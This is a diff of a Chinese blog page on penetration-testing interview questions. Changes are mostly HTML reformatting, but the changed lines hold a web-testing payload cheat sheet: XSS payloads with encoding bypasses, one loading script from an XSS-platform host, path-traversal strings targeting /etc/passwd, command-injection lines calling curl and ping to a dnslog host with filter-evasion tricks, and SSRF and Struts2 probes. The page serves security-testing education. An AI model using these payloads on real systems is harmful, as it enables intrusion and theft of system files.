@@ -92,14 +92,14 @@
 <meta name="description" content="渗透测试基本流程1.信息收集  服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等） 网站指纹识别（包括，cms，cdn，证书等），dns记录 whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等） 子域名收集，旁站查询(有授权可渗透)，C段等 google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等 扫描网站目录结构，爆后台，网站banner，测试">
 <meta name="keywords" content="Interview">
 <meta property="og:type" content="article">
-<meta property="og:title" content="安服面试问题">
+<meta property="og:title" content="安服问题">
 <meta property="og:url" content="https://winthorlimo.github.io/note/2020/undefined30/6a2e2a4a.html">
 <meta property="og:site_name" content="离沫凌天๓">
 <meta property="og:description" content="渗透测试基本流程1.信息收集  服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等） 网站指纹识别（包括，cms，cdn，证书等），dns记录 whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等） 子域名收集，旁站查询(有授权可渗透)，C段等 google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等 扫描网站目录结构，爆后台，网站banner，测试">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-08-02T05:50:41.729Z">
+<meta property="og:updated_time" content="2020-08-09T16:14:17.321Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="安服面试问题">
+<meta name="twitter:title" content="安服问题">
 <meta name="twitter:description" content="渗透测试基本流程1.信息收集  服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等） 网站指纹识别（包括，cms，cdn，证书等），dns记录 whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等） 子域名收集，旁站查询(有授权可渗透)，C段等 google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等 扫描网站目录结构，爆后台，网站banner，测试">
 
 
@@ -136,7 +136,7 @@
 
 
 
-  <title>安服面试问题 | 离沫凌天๓</title>
+  <title>安服问题 | 离沫凌天๓</title>
   
 
 
@@ -322,7 +322,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">安服面试问题</h2>
+          <h2 class="post-title" itemprop="name headline">安服问题</h2>
         
 
         <div class="post-meta">
@@ -465,7 +465,7 @@
 </ul>
 <ol>
 <li>用连续的弹出图片骚扰用户</li>
-<li>可以上传图片马，将jpg文件解析为php文件 </li>
+<li>可以上传图片马，将jpg文件解析为php文件</li>
 </ol>
 <h2 id="sql注入原理及防御"><a href="#sql注入原理及防御" class="headerlink" title="sql注入原理及防御"></a>sql注入原理及防御</h2><p>原理 ： 当网站在向后台数据库传递SQL语句进行数据库操作时。如果对用户输入的参数没有经过严格的过滤处理，那么恶意访问者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p>
 <p>防御：</p>
@@ -650,45 +650,47 @@
 </ol>
 <h3 id="常用web漏洞测试的payload整理"><a href="#常用web漏洞测试的payload整理" class="headerlink" title="常用web漏洞测试的payload整理"></a><strong>常用web漏洞测试的payload整理</strong></h3><p>[反射型xss]</p>
 <ul>
-<li><p>[在html形成]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&apos;&gt;&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;</span><br><span class="line">&lt;svg οnlοad=document.title=&quot;[random]&quot;;&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>[在js形成]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">document.title=&quot;[random]&quot;;//</span><br><span class="line">;document.title=&quot;[random]&quot;;//</span><br><span class="line">&quot;;document.title=&quot;[random]&quot;;</span><br><span class="line">&apos;;document.title=&quot;[random]&quot;;</span><br><span class="line">&quot;);document.title=&quot;[random]&quot;;</span><br><span class="line">&apos;);document.title=&quot;[random]&quot;;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>[在html属性形成(img)]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">888&quot; οnlοad=document.title=&quot;[random]&quot; a=&quot;</span><br><span class="line">888&apos; οnlοad=document.title=&quot;[random]&quot; a=&apos;</span><br><span class="line">888 οnlοad=document.title=&quot;[random]&quot;</span><br></pre></td></tr></table></figure>
-</li>
+<li>[在html形成]</li>
 </ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&apos;&gt;&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;</span><br><span class="line">&lt;svg οnlοad=document.title=&quot;[random]&quot;;&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>[在js形成]</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">document.title=&quot;[random]&quot;;//</span><br><span class="line">;document.title=&quot;[random]&quot;;//</span><br><span class="line">&quot;;document.title=&quot;[random]&quot;;</span><br><span class="line">&apos;;document.title=&quot;[random]&quot;;</span><br><span class="line">&quot;);document.title=&quot;[random]&quot;;</span><br><span class="line">&apos;);document.title=&quot;[random]&quot;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>[在html属性形成(img)]</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">888&quot; οnlοad=document.title=&quot;[random]&quot; a=&quot;</span><br><span class="line">888&apos; οnlοad=document.title=&quot;[random]&quot; a=&apos;</span><br><span class="line">888 οnlοad=document.title=&quot;[random]&quot;</span><br></pre></td></tr></table></figure>
 <p>[存储型xss]</p>
 <ul>
-<li>[通用payload]<br>测试环境，需要在触发的地方查看payload显示情况<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/StoredXssByScriptTag/);&lt;/script&gt;</span><br><span class="line">&quot;&apos;&gt;&lt;script&gt;alert(/StoredXssByScriptTagBypass);&lt;/script&gt;</span><br><span class="line">[Bypass on Event] [事件型绕过]</span><br><span class="line"></span><br><span class="line">&lt;img src=1 οnerrοr=alert(/StoredXssByImgTag/)&gt;  #一般富文本不会过滤img标签</span><br><span class="line">[Bypass pseudo protocol] [伪协议绕过]</span><br><span class="line"></span><br><span class="line">&lt;iframe src=javascript:prompt(/StoredXssByIframeTag/);&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;object data=data:text/html;base64,PHNjcmlwdD5wcm9tcHQoL1N0b3JlZFhzc0J5T2JqZWN0VGFnLyk7PC9zY3JpcHQ+&gt;&lt;/object&gt;</span><br><span class="line">[Bypass html5 tag] [html5标签绕过]</span><br><span class="line"></span><br><span class="line">&lt;svg οnlοad=prompt(/StoredXssBySvgTag/)&gt;</span><br><span class="line">&lt;embed src=javascript:alert(/StoredXssByEmbedTag/);&gt;</span><br><span class="line">[Bypass html or js encode] [js编码，html编码，十进制编码绕过等]</span><br><span class="line"></span><br><span class="line">&lt;embed src=javas&amp;#99;r&amp;#105;pt:alert(/StoredXssByEmbedTagAndHtmlEncode/);&gt;</span><br><span class="line">&lt;video&gt;&lt;source οnerrοr=alert(String.fromCharCode(47,83,116,111,114,101,100,88,115,115,98,121,86,105,100,101,111,84,97,103,65,110,100,83,116,114,105,110,103,69,110,99,111,100,101,47))&gt;</span><br><span class="line">&lt;script/src=data:text/j\141v\141script,\u0061%6C%65%72%74(/StoredXssbyScriptTagAndJSEncode/)&gt;&lt;/script&gt;</span><br><span class="line">如果进行盲测可以根据xss平台地址替换相应的js触发代码</span><br><span class="line">&quot;&gt;&lt;script src=http://myxss.net/xxxxxx&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-</li>
+<li>[通用payload]<br>测试环境，需要在触发的地方查看payload显示情况</li>
 </ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/StoredXssByScriptTag/);&lt;/script&gt;</span><br><span class="line">&quot;&apos;&gt;&lt;script&gt;alert(/StoredXssByScriptTagBypass);&lt;/script&gt;</span><br><span class="line">[Bypass on Event] [事件型绕过]</span><br><span class="line"></span><br><span class="line">&lt;img src=1 οnerrοr=alert(/StoredXssByImgTag/)&gt;  #一般富文本不会过滤img标签</span><br><span class="line">[Bypass pseudo protocol] [伪协议绕过]</span><br><span class="line"></span><br><span class="line">&lt;iframe src=javascript:prompt(/StoredXssByIframeTag/);&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;object data=data:text/html;base64,PHNjcmlwdD5wcm9tcHQoL1N0b3JlZFhzc0J5T2JqZWN0VGFnLyk7PC9zY3JpcHQ+&gt;&lt;/object&gt;</span><br><span class="line">[Bypass html5 tag] [html5标签绕过]</span><br><span class="line"></span><br><span class="line">&lt;svg οnlοad=prompt(/StoredXssBySvgTag/)&gt;</span><br><span class="line">&lt;embed src=javascript:alert(/StoredXssByEmbedTag/);&gt;</span><br><span class="line">[Bypass html or js encode] [js编码，html编码，十进制编码绕过等]</span><br><span class="line"></span><br><span class="line">&lt;embed src=javas&amp;#99;r&amp;#105;pt:alert(/StoredXssByEmbedTagAndHtmlEncode/);&gt;</span><br><span class="line">&lt;video&gt;&lt;source οnerrοr=alert(String.fromCharCode(47,83,116,111,114,101,100,88,115,115,98,121,86,105,100,101,111,84,97,103,65,110,100,83,116,114,105,110,103,69,110,99,111,100,101,47))&gt;</span><br><span class="line">&lt;script/src=data:text/j\141v\141script,\u0061%6C%65%72%74(/StoredXssbyScriptTagAndJSEncode/)&gt;&lt;/script&gt;</span><br><span class="line">如果进行盲测可以根据xss平台地址替换相应的js触发代码</span><br><span class="line">&quot;&gt;&lt;script src=http://myxss.net/xxxxxx&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 <p>[静态文件读取]</p>
 <ul>
 <li><p>[常规检测]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/../../../../../../../../../../../etc/passwd</span><br><span class="line">/../../../../../../../../../../../etc/hosts     </span><br><span class="line">/../../../../../../../C:/Windows/system.ini [windows]</span><br></pre></td></tr></table></figure>
-<ul>
-<li>[伪造绕过]<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/././././././././././././././././././././././././../../../../../../etc/passwd      </span><br><span class="line">/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd </span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd </span><br><span class="line">/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</span><br><span class="line">/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd     </span><br><span class="line">/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/../../../../../../../../../../../etc/passwd</span><br><span class="line">/../../../../../../../../../../../etc/hosts</span><br><span class="line">/../../../../../../../C:/Windows/system.ini [windows]</span><br></pre></td></tr></table></figure>
 </li>
-</ul>
+<li><p>[伪造绕过]</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/././././././././././././././././././././././././../../../../../../etc/passwd</span><br><span class="line">/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</span><br><span class="line">/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd</span><br><span class="line">/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>[后缀绕过]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/../../../../../../../../../../../etc/passwd#</span><br><span class="line">/../../../../../../../../../../../etc/passwd%00</span><br><span class="line">/../../../../../../../../../../../etc/passwd#.jpg</span><br><span class="line">/../../../../../../../../../../../etc/passwd%00.jpg</span><br><span class="line">/../../../../../../../../../../../etc/passwd#.html</span><br><span class="line">/../../../../../../../../../../../etc/passwd%00.html</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.jpg</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.html</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.jpg</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.html</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/../../../../../../../../../../../etc/passwd#</span><br><span class="line">/../../../../../../../../../../../etc/passwd%00</span><br><span class="line">/../../../../../../../../../../../etc/passwd#.jpg</span><br><span class="line">/../../../../../../../../../../../etc/passwd%00.jpg</span><br><span class="line">/../../../../../../../../../../../etc/passwd#.html</span><br><span class="line">/../../../../../../../../../../../etc/passwd%00.html</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.jpg</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.html</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.jpg</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.html</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <p>[命令执行漏洞]</p>
 <ul>
 <li><p>[常规检测]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;curl [random].test.dnslog.link</span><br><span class="line"> | curl [random].test.dnslog.link</span><br><span class="line"> | ping -n 2 [random].test.dnslog.link [Windows]</span><br><span class="line"> | ping -c 2 [random].test.dnslog.link  [Linux]</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;curl [random].test.dnslog.link</span><br><span class="line"> | curl [random].test.dnslog.link</span><br><span class="line"> | ping -n 2 [random].test.dnslog.link [Windows]</span><br><span class="line"> | ping -c 2 [random].test.dnslog.link  [Linux]</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>[绕过检测]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">;curl [random].test.dnslog.link#</span><br><span class="line"> | curl [random].test.dnslog.link#</span><br><span class="line">%20|%20curl%20[random].test.dnslog.link</span><br><span class="line">%20|%20curl%20[random].test.dnslog.link#</span><br><span class="line">%20|%20ping%20-n%202%20[random].test.dnslog.link</span><br><span class="line">%20|%20ping%20-c%202%20[random].test.dnslog.link#</span><br><span class="line">a=p;b=ing;c=c;d=2;$a$b -$c $d [random].test.dnslog.link</span><br><span class="line">a=c;b=url;$a$b [random].test.dnslog.link#</span><br><span class="line">$&#123;IFS&#125;|$&#123;IFS&#125;curl$&#123;IFS&#125;[random].test.dnslog.link</span><br><span class="line">$&#123;IFS&#125;|$&#123;IFS&#125;ping$&#123;IFS&#125;-c$&#123;IFS&#125;2$&#123;IFS&#125;[random].test.dnslog.link</span><br><span class="line">a=p;b=ing;c=c;d=2;$a$b&#123;IFS&#125;-$c&#123;IFS&#125;$d&#123;IFS&#125;[random].test.dnslog.link</span><br><span class="line">a=c;b=url;$a$b&#123;IFS&#125;[random].test.dnslog.link#</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">;curl [random].test.dnslog.link#</span><br><span class="line"> | curl [random].test.dnslog.link#</span><br><span class="line">%20|%20curl%20[random].test.dnslog.link</span><br><span class="line">%20|%20curl%20[random].test.dnslog.link#</span><br><span class="line">%20|%20ping%20-n%202%20[random].test.dnslog.link</span><br><span class="line">%20|%20ping%20-c%202%20[random].test.dnslog.link#</span><br><span class="line">a=p;b=ing;c=c;d=2;$a$b -$c $d [random].test.dnslog.link</span><br><span class="line">a=c;b=url;$a$b [random].test.dnslog.link#</span><br><span class="line">$&#123;IFS&#125;|$&#123;IFS&#125;curl$&#123;IFS&#125;[random].test.dnslog.link</span><br><span class="line">$&#123;IFS&#125;|$&#123;IFS&#125;ping$&#123;IFS&#125;-c$&#123;IFS&#125;2$&#123;IFS&#125;[random].test.dnslog.link</span><br><span class="line">a=p;b=ing;c=c;d=2;$a$b&#123;IFS&#125;-$c&#123;IFS&#125;$d&#123;IFS&#125;[random].test.dnslog.link</span><br><span class="line">a=c;b=url;$a$b&#123;IFS&#125;[random].test.dnslog.link#</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<p>[ssrf漏洞]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[random].test.dnslog.link/</span><br></pre></td></tr></table></figure></p>
-<p>[strust2命令执行]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:http://[random].test.dnslog.link/%25&#123;3*4&#125;</span><br></pre></td></tr></table></figure></p>
+<p>[ssrf漏洞]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[random].test.dnslog.link/</span><br></pre></td></tr></table></figure>
+<p>[strust2命令执行]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:http://[random].test.dnslog.link/%25&#123;3*4&#125;</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -810,7 +812,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -821,7 +823,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -832,7 +834,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -923,7 +925,7 @@
     <!-- 博客字数统计 -->
     <span class="site-pv">
       <i class="fa fa-pencil"></i>
-    全站字数：<span class="post-count">25.7k</span>
+    全站字数：<span class="post-count">61.2k</span>
     </span>
 </div>
 
